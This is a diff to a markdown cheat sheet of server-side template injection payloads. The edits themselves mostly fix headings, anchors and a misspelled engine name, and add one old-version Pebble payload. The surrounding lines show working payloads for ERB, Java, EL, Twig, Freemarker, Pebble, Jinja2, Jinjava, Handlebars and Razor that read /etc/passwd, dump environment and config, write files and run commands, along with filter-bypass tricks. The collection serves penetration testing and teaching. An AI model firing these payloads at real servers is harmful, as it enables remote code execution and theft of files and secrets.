@@ -7,48 +7,48 @@
 * [Tools](#tools)
 * [Methodology](#methodology)
 * [Ruby](#ruby)
-  * [Basic injections](#basic-injections)
-  * [Retrieve /etc/passwd](#retrieve--etc-passwd)
-  * [List files and directories](#list-files-and-directories)
+  * [Basic injections](#ruby---basic-injections)
+  * [Retrieve /etc/passwd](#ruby---retrieve--etc-passwd)
+  * [List files and directories](#ruby---list-files-and-directories)
 * [Java](#java)
-  * [Basic injection](#basic-injection)
-  * [Retrieve the system’s environment variables](retrieve-the-system-s-environment-variables)
-  * [Retrieve /etc/passwd](#retrieve--etc-passwd)
+  * [Basic injection](#java---basic-injection)
+  * [Retrieve the system’s environment variables](#java---retrieve-the-system-s-environment-variables)
+  * [Retrieve /etc/passwd](#java---retrieve--etc-passwd)
 * [Expression Language EL](#expression-language-el)
-  * [Basic injection](#basic-injection)
-  * [Code execution](#code-execution)
+  * [Basic injection](#expression-language-el---basic-injection)
+  * [Code execution](#expression-language-el---code-execution)
 * [Twig](#twig)
-  * [Basic injection](#basic-injection)
-  * [Template format](#template-format)
-  * [Arbitrary File Reading](#arbitrary-file-reading)
-  * [Code execution](#code-execution)
+  * [Basic injection](#twig---basic-injection)
+  * [Template format](#twig---template-format)
+  * [Arbitrary File Reading](#twig---arbitrary-file-reading)
+  * [Code execution](#twig---code-execution)
 * [Smarty](#smarty)
 * [Freemarker](#freemarker)
-  * [Basic injection](#basic-injection)
-  * [Code execution](#code-execution)
-* [Peeble](#peeble)
-  * [Basic injection](#basic-injection)
-  * [Code execution](#code-execution)
+  * [Basic injection](#freemarker---basic-injection)
+  * [Code execution](#freemarker---code-execution)
+* [Pebble](#pebble)
+  * [Basic injection](#pebble---basic-injection)
+  * [Code execution](#pebble---code-execution)
 * [Jade / Codepen](#jade---codepen)
 * [Velocity](#velocity)
 * [Mako](#mako)
 * [Jinja2](#jinja2)
-  * [Basic injection](#basic-injection)
-  * [Template format](#template-format)
-  * [Debug Statement](#debug-statement)
-  * [Dump all used classes](#dump-all-used-classes)
-  * [Dump all config variables](#dump-all-config-variables)
-  * [Read remote file](#read-remote-file)
-  * [Write into remote file](#write-into-remote-file)
-  * [Remote Code Execution](#remote-code-execution)
-  * [Filter bypass](filter-bypass)
+  * [Basic injection](#jinja2---basic-injection)
+  * [Template format](#jinja2---template-format)
+  * [Debug Statement](#jinja2---debug-statement)
+  * [Dump all used classes](#jinja2---dump-all-used-classes)
+  * [Dump all config variables](#jinja2---dump-all-config-variables)
+  * [Read remote file](#jinja2---read-remote-file)
+  * [Write into remote file](#jinja2---write-into-remote-file)
+  * [Remote Code Execution](#jinja2---remote-code-execution)
+  * [Filter bypass](#jinja2---filter-bypass)
 * [Jinjava](#jinjava)
-  * [Basic injection](#basic-injection)
-  * [Command execution](#command-execution)
+  * [Basic injection](#jinjava---basic-injection)
+  * [Command execution](#jinjava---command-execution)
 * [Handlebars](#handlebars)
 * [ASP.NET Razor](#aspnet-razor)
-  * [Basic injection](#basic-injection)
-  * [Command execution](#command-execution)
+  * [Basic injection](#aspnet-razor---basic-injection)
+  * [Command execution](#aspnet-razor---command-execution)
 * [References](#references)
 
 ## Tools
@@ -68,7 +68,7 @@ python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment
 
 ## Ruby
 
-### Basic injections
+### Ruby - Basic injections
 
 ERB:
 
@@ -82,19 +82,19 @@ Slim:
 #{ 7 * 7 }
 ```
 
-### Retrieve /etc/passwd
+### Ruby - Retrieve /etc/passwd
 
 ```ruby
 <%= File.open('/etc/passwd').read %>
 ```
 
-### List files and directories
+### Ruby - List files and directories
 
 ```ruby
 <%= Dir.entries('/') %>
 ```
 
-### Code execution
+### Ruby - Code execution
 
 Execute code using SSTI for ERB engine.
 
@@ -115,7 +115,7 @@ Execute code using SSTI for Slim engine.
 
 ## Java
 
-### Basic injection
+### Java - Basic injection
 
 ```java
 ${7*7}
@@ -125,13 +125,13 @@ ${class.getResource("").getPath()}
 ${class.getResource("../../../../../index.htm").getContent()}
 ```
 
-### Retrieve the system’s environment variables
+### Java - Retrieve the system’s environment variables
 
 ```java
 ${T(java.lang.System).getenv()}
 ```
 
-### Retrieve /etc/passwd
+### Java - Retrieve /etc/passwd
 
 ```java
 ${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
@@ -141,14 +141,14 @@ ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().ex
 
 ## Expression Language EL
 
-### Basic injection
+### Expression Language EL - Basic injection
 
 ```java
 ${1+1} 
 #{1+1}
 ```
 
-### Code Execution
+### Expression Language EL - Code Execution
 
 
 ```java
@@ -182,7 +182,7 @@ ${facesContext.getExternalContext().setResponseHeader("output","".getClass().for
 
 ## Twig
 
-### Basic injection
+### Twig - Basic injection
 
 ```python
 {{7*7}}
@@ -191,7 +191,7 @@ ${facesContext.getExternalContext().setResponseHeader("output","".getClass().for
 {{app.request.server.all|join(',')}}
 ```
 
-### Template format
+### Twig - Template format
 
 ```python
 $output = $twig > render (
@@ -205,13 +205,13 @@ $output = $twig > render (
 );
 ```
 
-### Arbitrary File Reading
+### Twig - Arbitrary File Reading
 
 ```python
 "{{'/etc/passwd'|file_excerpt(1,30)}}"@
 ```
 
-### Code execution
+### Twig - Code execution
 
 ```python
 {{self}}
@@ -241,11 +241,11 @@ email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
 
 You can try your payloads at [https://try.freemarker.apache.org](https://try.freemarker.apache.org)
 
-### Basic injection
+### Freemarker - Basic injection
 
 The template can be `${3*3}` or the legacy `#{3*3}`
 
-### Code execution
+### Freemarker - Code execution
 
 ```js
 <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
@@ -255,13 +255,17 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 
 ## Pebble
 
-### Basic injection
+### Pebble - Basic injection
 
 ```java
 {{ someString.toUPPERCASE() }}
 ```
 
-### Code execution
+### Pebble - Code execution
+
+Old version of Pebble ( < version 3.0.9): `{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}`.
+
+New version of Pebble :
 
 ```java
 {% set cmd = 'id' %}
@@ -315,7 +319,7 @@ ${x}
 [Official website](http://jinja.pocoo.org/)
 > Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.  
 
-### Basic injection
+### Jinja2 - Basic injection
 
 ```python
 {{4*4}}[[5*5]]
@@ -326,7 +330,7 @@ ${x}
 Jinja2 is used by Python Web Frameworks such as Django or Flask.
 The above injections have been tested on Flask application.
 
-### Template format
+### Jinja2 - Template format
 
 ```python
 {% extends "layout.html" %}
@@ -340,7 +344,7 @@ The above injections have been tested on Flask application.
 
 ```
 
-### Debug Statement¶
+### Jinja2 - Debug Statement
 
 If the Debug Extension is enabled, a `{% debug %}` tag will be available to dump the current context as well as the available filters and tests. This is useful to see what’s available to use in the template without setting up a debugger.
 
@@ -350,7 +354,7 @@ If the Debug Extension is enabled, a `{% debug %}` tag will be available to dump
 
 Source: https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement
 
-### Dump all used classes
+### Jinja2 - Dump all used classes
 
 ```python
 {{ [].class.base.subclasses() }}
@@ -358,7 +362,7 @@ Source: https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement
 {{ ''.__class__.__mro__[2].__subclasses__() }}
 ```
 
-### Dump all config variables
+### Jinja2 - Dump all config variables
 
 ```python
 {% for key, value in config.iteritems() %}
@@ -367,7 +371,7 @@ Source: https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement
 {% endfor %}
 ```
 
-### Read remote file
+### Jinja2 - Read remote file
 
 ```python
 # ''.__class__.__mro__[2].__subclasses__()[40] = File class
@@ -375,13 +379,13 @@ Source: https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement
 {{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
 ```
 
-### Write into remote file
+### Jinja2 - Write into remote file
 
 ```python
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
 ```
 
-### Remote Code Execution
+### Jinja2 - Remote Code Execution
 
 Listen for connexion
 
@@ -424,7 +428,7 @@ In another GET parameter include a variable named "input" that contains the comm
 ```
 
 
-### Filter bypass
+### Jinja2 - Filter bypass
 
 ```python
 request.__class__
@@ -464,7 +468,7 @@ Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by http
 
 ## Jinjava
 
-### Basic injection
+### Jinjava - Basic injection
 
 ```python
 {{'a'.toUpperCase()}} would result in 'A'
@@ -473,7 +477,7 @@ Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by http
 
 Jinjava is an open source project developped by Hubspot, available at [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)
 
-### Command execution 
+### Jinjava - Command execution 
 
 Fixed by https://github.com/HubSpot/jinjava/pull/230
 
@@ -490,7 +494,7 @@ Fixed by https://github.com/HubSpot/jinjava/pull/230
 
 ## Handlebars
 
-### Command Execution
+### Handlebars - Command Execution
 
 ```handlebars
 {{#with "s" as |string|}}
@@ -514,20 +518,15 @@ Fixed by https://github.com/HubSpot/jinjava/pull/230
 {{/with}}
 ```
 
-### References
-
-- [Handlebars template injection and RCE in a Shopify app ](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)
-- [Lab: Server-side template injection in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
-
 ## ASP.NET Razor
 
-### Basic injection
+### ASP.NET Razor - Basic injection
 
 ```powershell
 @(1+2)
 ```
 
-### Command execution 
+### ASP.NET Razor - Command execution 
 
 ```csharp
 @{
@@ -554,3 +553,5 @@ Fixed by https://github.com/HubSpot/jinjava/pull/230
 * [Expression Language injection - PortSwigger](https://portswigger.net/kb/issues/00100f20_expression-language-injection)
 * [Bean Stalking: Growing Java beans into RCE - July 7, 2020 - Github Security Lab](https://securitylab.github.com/research/bean-validation-RCE)
 * [Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - 29/01/2019](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
+* [Handlebars template injection and RCE in a Shopify app ](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)
+* [Lab: Server-side template injection in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
